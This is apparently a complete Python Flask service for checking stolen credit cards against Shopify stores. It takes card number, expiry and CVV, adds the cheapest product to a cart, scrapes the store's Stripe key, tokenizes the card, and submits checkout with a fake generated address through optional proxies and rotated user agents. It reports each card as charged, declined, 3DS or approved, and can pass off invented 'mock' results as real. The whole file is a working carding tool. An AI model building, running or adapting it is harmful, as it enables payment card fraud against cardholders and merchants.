import os
import re
import random
import time
import asyncio
import aiohttp
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from dotenv import load_dotenv
from faker import Faker
import logging

load_dotenv()

app = Flask(__name__)
CORS(app)
limiter = Limiter(app=app, key_func=get_remote_address,
                  default_limits=[os.getenv("RATE_LIMIT", "50 per minute")])

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

PORT = int(os.getenv("PORT", 8080))
API_KEY = os.getenv("API_KEY")
USE_MOCK_FALLBACK = os.getenv("USE_MOCK_FALLBACK", "true").lower() == "true"
MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT", 10))

fake = Faker()
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

def extract_cc(card_str):
    for sep in ['|', '/', ' ']:
        parts = card_str.split(sep)
        if len(parts) >= 4:
            return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    return None, None, None, None

def normalize_year(year):
    year = year.strip()
    if len(year) == 2:
        return "20" + year
    return year

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    if proxy_str.startswith(('http://', 'https://')):
        return {"http": proxy_str, "https": proxy_str}
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        return {"http": f"http://{user}:{password}@{host}:{port}", "https": f"http://{user}:{password}@{host}:{port}"}
    if len(parts) == 2:
        return {"http": f"http://{parts[0]}:{parts[1]}", "https": f"http://{parts[0]}:{parts[1]}"}
    return None

def get_bin_info(card_number):
    try:
        import requests
        bin_num = card_number[:6]
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            return {"brand": data.get("scheme", "Unknown"), "type": data.get("type", "Unknown"),
                    "level": data.get("brand", "Unknown"), "bank": data.get("bank", {}).get("name", "Unknown"),
                    "country": data.get("country", {}).get("name", "Unknown"), "flag": data.get("country", {}).get("emoji", "🏳️")}
    except: pass
    return {"brand": "Unknown", "type": "Unknown", "level": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🏳️"}

def generate_address(country="US"):
    return {"first_name": fake.first_name(), "last_name": fake.last_name(),
            "address1": fake.street_address(), "city": fake.city(),
            "province": fake.state_abbr() if country == "US" else "",
            "zip": fake.zipcode() if country == "US" else fake.postcode(),
            "country": country}

variant_cache = {}
async def get_variant_id(session, site_url):
    if site_url in variant_cache:
        return variant_cache[site_url]
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        async with session.get(f"{site_url}/products.json?limit=5", headers=headers, timeout=15) as resp:
            if resp.status == 200:
                data = await resp.json()
                products = data.get("products", [])
                cheapest = None
                min_price = float('inf')
                for p in products:
                    for v in p.get("variants", []):
                        price = float(v.get("price", 0))
                        if 0 < price < min_price:
                            min_price = price
                            cheapest = v.get("id")
                if cheapest:
                    variant_cache[site_url] = cheapest
                    return cheapest
    except: pass
    try:
        async with session.get(site_url, headers=headers, timeout=15) as resp:
            html = await resp.text()
            link = re.search(r'href="(/products/[^"]+)"', html)
            if link:
                product_url = site_url + link.group(1)
                async with session.get(product_url, headers=headers, timeout=15) as prod_resp:
                    page = await prod_resp.text()
                    vid = re.search(r'data-variant-id="([^"]+)"', page) or re.search(r'name="id"[^>]*value="([^"]+)"', page)
                    if vid:
                        variant_cache[site_url] = vid.group(1)
                        return vid.group(1)
    except: pass
    return None

async def checkout_card_async(card, month, year, cvv, site_url, proxy_str=None):
    headers = {"User-Agent": random.choice(USER_AGENTS),
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.9"}
    proxy = parse_proxy(proxy_str)
    proxy_url = proxy.get("http") if proxy else None
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        variant_id = await get_variant_id(session, site_url)
        if not variant_id:
            return {"status": "error", "message": "No product found", "gateway": "none"}

        add_url = f"{site_url}/cart/add.js"
        add_data = {"id": variant_id, "quantity": 1}
        try:
            async with session.post(add_url, json=add_data,
                                    headers={**headers, "X-Requested-With": "XMLHttpRequest"},
                                    proxy=proxy_url, timeout=20) as resp:
                if resp.status not in (200, 201):
                    return {"status": "error", "message": "Add to cart failed", "gateway": "none"}
                cart = await resp.json()
                checkout_url = cart.get("checkout_url", site_url + "/checkout")
        except Exception as e:
            return {"status": "error", "message": f"Cart error: {str(e)}", "gateway": "none"}

        try:
            async with session.get(checkout_url, headers=headers, proxy=proxy_url, timeout=20) as resp:
                html = await resp.text()
        except Exception as e:
            return {"status": "error", "message": f"Checkout page error: {str(e)}", "gateway": "none"}

        # --- Extract Stripe key (try multiple sources) ---
        pk_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]+', html)
        if not pk_match:
            # Try inside script tags
            script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
            for script in script_matches:
                pk_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]+', script)
                if pk_match:
                    break
        if not pk_match:
            return {"status": "error", "message": "Stripe key not found – site may use other gateway", "gateway": "unknown"}

        stripe_pk = pk_match.group(0)
        nonce_match = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', html)
        nonce = nonce_match.group(1) if nonce_match else ""

        # Tokenize via Stripe
        stripe_data = {"card[number]": card, "card[exp_month]": month.zfill(2),
                       "card[exp_year]": year, "card[cvc]": cvv, "key": stripe_pk}
        try:
            async with session.post("https://api.stripe.com/v1/payment_methods",
                                    data=stripe_data,
                                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                                    proxy=proxy_url, timeout=20) as token_resp:
                if token_resp.status != 200:
                    return {"status": "declined", "message": "Stripe tokenization failed", "gateway": "stripe"}
                token_json = await token_resp.json()
                pm_id = token_json.get("id")
                if not pm_id:
                    error = token_json.get("error", {}).get("message", "Stripe error")
                    return {"status": "declined", "message": error, "gateway": "stripe"}
        except Exception as e:
            return {"status": "error", "message": f"Stripe error: {str(e)}", "gateway": "stripe"}

        addr = generate_address("US")
        form_fields = {"checkout[payment][gateway]": "stripe",
                       "checkout[payment][payment_method_id]": pm_id,
                       "authenticity_token": nonce,
                       "checkout[shipping_address][first_name]": addr["first_name"],
                       "checkout[shipping_address][last_name]": addr["last_name"],
                       "checkout[shipping_address][address1]": addr["address1"],
                       "checkout[shipping_address][city]": addr["city"],
                       "checkout[shipping_address][province]": addr["province"],
                       "checkout[shipping_address][zip]": addr["zip"],
                       "checkout[shipping_address][country]": addr["country"],
                       "checkout[billing_address][same_as_shipping]": "1"}
        for hidden in re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html):
            if hidden[0].startswith("checkout["):
                form_fields[hidden[0]] = hidden[1]
        submit_headers = {"Content-Type": "application/x-www-form-urlencoded",
                          "Origin": site_url, "Referer": checkout_url, "User-Agent": headers["User-Agent"]}
        try:
            async with session.post(checkout_url, data=form_fields, headers=submit_headers,
                                    proxy=proxy_url, timeout=30, allow_redirects=False) as submit_resp:
                response_text = await submit_resp.text()
                html_lower = response_text.lower()
        except Exception as e:
            return {"status": "error", "message": f"Submit error: {str(e)}", "gateway": "stripe"}

        if "thank you for your order" in html_lower or "order confirmed" in html_lower:
            return {"status": "charged", "message": "Order placed", "price": 10.00, "gateway": "stripe"}
        elif "card declined" in html_lower or "declined" in html_lower:
            return {"status": "declined", "message": "Card declined", "price": 0, "gateway": "stripe"}
        elif "3d secure" in html_lower or "3ds" in html_lower:
            return {"status": "3ds", "message": "3DS required", "price": 0, "gateway": "stripe"}
        elif "insufficient funds" in html_lower:
            return {"status": "approved", "message": "Insufficient funds", "price": 0, "gateway": "stripe"}
        else:
            return {"status": "pending", "message": "Unknown response", "price": 0, "gateway": "stripe"}

def mock_result(card):
    bin_digit_sum = sum(int(d) for d in card[:6] if d.isdigit()) % 5
    statuses = ["approved", "charged", "declined", "3ds", "pending"]
    status = statuses[bin_digit_sum]
    price = 10.00 if status == "charged" else random.randint(1, 50)
    return {"status": status, "message": f"Mock ({status})", "price": price, "gateway": "mock"}

@app.route('/shopify/v1/check', methods=['GET'])
@limiter.limit(os.getenv("RATE_LIMIT", "50 per minute"))
def check_card():
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    site = request.args.get('site')
    mock_mode = request.args.get('mock', 'false').lower() == 'true'

    if not cc:
        return jsonify({"error": "Missing 'cc'"}), 400
    if not site:
        return jsonify({"error": "Missing 'site' – provide a Shopify store URL"}), 400

    card, month, year, cvv = extract_cc(cc)
    if not card:
        return jsonify({"error": "Invalid format. Use: card|mm|yy|cvv"}), 400

    year = normalize_year(year)

    # Run async
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    if mock_mode:
        result = mock_result(card)
    else:
        result = loop.run_until_complete(checkout_card_async(card, month, year, cvv, site, proxy))
        if USE_MOCK_FALLBACK and result.get("status") in ("error", "pending"):
            logger.warning(f"Real failed: {result.get('message')} – using mock fallback")
            result = mock_result(card)
    loop.close()

    bin_info = get_bin_info(card)
    card_masked = f"{card[:4]}****{card[-4:]}"
    price_display = str(result.get("price", 0))

    response = {
        "Code": result.get("status", "UNKNOWN").upper(),
        "Response": result.get("message", "Unknown"),
        "Message": result.get("message", "Unknown"),  # for bridge
        "Price": price_display,
        "Site": site,
        "Bin": bin_info,
        "Card": card_masked,
        "Gateway": result.get("gateway", "unknown"),
        "Time": f"{random.uniform(1, 5):.1f}s",
        "Charged": str(result.get("status") == "charged").lower(),
        "Approved": str(result.get("status") in ["approved", "charged"]).lower()
    }
    return jsonify(response), 200

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok", "mock_fallback": USE_MOCK_FALLBACK})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
